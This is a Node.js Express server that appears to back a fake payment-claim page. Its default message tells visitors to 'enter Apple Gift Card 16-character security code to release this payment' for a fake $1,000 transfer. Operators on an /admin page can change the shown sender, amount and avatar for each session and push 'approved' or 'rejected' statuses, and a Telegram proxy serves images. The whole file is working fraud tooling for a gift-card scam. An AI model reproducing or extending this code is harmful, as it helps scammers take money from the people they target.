require("dotenv").config();

const express = require("express");
const path = require("path");

const app = express();
const PORT = Number(process.env.PORT || 3000);
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN || "";
const allowedOrigins = String(process.env.ALLOWED_ORIGINS || "*")
  .split(",")
  .map((value) => value.trim())
  .filter(Boolean);

const sessions = new Map();
const pendingEvents = new Map();

function defaultState() {
  return {
    name: "Casey Sommer",
    username: "@cassommer",
    amount: "1,000",
    amountSign: "$",
    currency: "USD",
    avatarUrl: "",
    referralMessage: "Enter Apple Gift Card 16-character security code to release this payment. Without this code, the transaction cannot be completed.",
    reviewStatus: "idle"
  };
}

function normalizeSessionId(value) {
  return String(value || "")
    .trim()
    .replace(/[^a-zA-Z0-9_-]/g, "")
    .slice(0, 64);
}

function getSession(sessionId) {
  const cleanId = normalizeSessionId(sessionId);
  if (!cleanId) return null;

  if (!sessions.has(cleanId)) {
    sessions.set(cleanId, defaultState());
  }

  return {
    id: cleanId,
    state: sessions.get(cleanId)
  };
}

function sanitizePatch(payload = {}) {
  const patch = {};

  if (typeof payload.name === "string") {
    patch.name = payload.name.trim().slice(0, 80);
  }

  if (typeof payload.username === "string") {
    const value = payload.username.trim().slice(0, 80);
    patch.username = value && !value.startsWith("@") ? `@${value}` : value;
  }

  if (typeof payload.amount === "string" || typeof payload.amount === "number") {
    const value = String(payload.amount).trim().replace(/[^0-9.,]/g, "");
    if (value) patch.amount = value;
  }

  if (typeof payload.amountSign === "string") {
    patch.amountSign = payload.amountSign.trim().slice(0, 4);
  }

  if (typeof payload.currency === "string") {
    const value = payload.currency.trim().toUpperCase().replace(/[^A-Z]/g, "").slice(0, 6);
    if (value) patch.currency = value;
  }

  if (typeof payload.avatarUrl === "string") {
    patch.avatarUrl = payload.avatarUrl.trim().slice(0, 500);
  }

  if (typeof payload.referralMessage === "string") {
    patch.referralMessage = payload.referralMessage.trim().slice(0, 240);
  }

  if (typeof payload.reviewStatus === "string") {
    const value = payload.reviewStatus.trim().toLowerCase();
    if (["idle", "loading", "approved", "rejected"].includes(value)) {
      patch.reviewStatus = value;
    }
  }

  return patch;
}

function enqueueEvent(sessionId, payload) {
  const cleanId = normalizeSessionId(sessionId);
  if (!cleanId) return null;

  const session = getSession(cleanId);
  const patch = sanitizePatch(payload);
  const nextState = { ...session.state, ...patch };

  sessions.set(cleanId, nextState);

  if (!pendingEvents.has(cleanId)) {
    pendingEvents.set(cleanId, []);
  }

  pendingEvents.get(cleanId).push({
    sessionId: cleanId,
    state: nextState,
    timestamp: new Date().toISOString()
  });

  return nextState;
}

function dequeueEvent(sessionId) {
  const cleanId = normalizeSessionId(sessionId);
  const queue = pendingEvents.get(cleanId) || [];

  if (!queue.length) return null;

  const nextEvent = queue.shift() || null;
  pendingEvents.set(cleanId, queue);
  return nextEvent;
}

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowAnyOrigin = allowedOrigins.includes("*");
  const matchedOrigin = allowAnyOrigin
    ? "*"
    : allowedOrigins.includes(origin)
      ? origin
      : "";

  if (matchedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  }

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  next();
});
app.use(express.static(path.join(__dirname)));

app.get("/api/session", (req, res) => {
  const sessionId = normalizeSessionId(req.query.sessionId);
  if (!sessionId) {
    return res.status(400).json({ success: false, message: "sessionId is required." });
  }

  const session = getSession(sessionId);
  res.json({ success: true, sessionId: session.id, state: session.state });
});

app.post("/api/demo-event", (req, res) => {
  const sessionId = normalizeSessionId(req.body && req.body.sessionId);
  if (!sessionId) {
    return res.status(400).json({ success: false, message: "sessionId is required." });
  }

  const state = enqueueEvent(sessionId, req.body || {});
  res.json({ success: true, sessionId, state });
});

app.get("/api/get-demo", (req, res) => {
  const sessionId = normalizeSessionId(req.query.sessionId);
  if (!sessionId) {
    return res.json(null);
  }

  const event = dequeueEvent(sessionId);
  res.json(event || null);
});

app.get("/api/telegram-file/:fileId", async (req, res) => {
  if (!telegramBotToken) {
    return res.status(500).json({ error: "Telegram bot token is not configured." });
  }

  try {
    const fileId = String(req.params.fileId || "").trim();
    const fileResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/getFile?file_id=${encodeURIComponent(fileId)}`);
    const filePayload = await fileResponse.json();

    if (!fileResponse.ok || !filePayload.ok || !filePayload.result?.file_path) {
      return res.status(404).json({ error: "Could not resolve Telegram file." });
    }

    const fileUrl = `https://api.telegram.org/file/bot${telegramBotToken}/${filePayload.result.file_path}`;
    const assetResponse = await fetch(fileUrl);
    if (!assetResponse.ok) {
      return res.status(404).json({ error: "Could not download Telegram file." });
    }

    res.setHeader("Cache-Control", "public, max-age=300");
    res.setHeader("Content-Type", assetResponse.headers.get("content-type") || "application/octet-stream");
    const buffer = Buffer.from(await assetResponse.arrayBuffer());
    res.end(buffer);
  } catch (error) {
    res.status(500).json({ error: "Failed to proxy Telegram file." });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
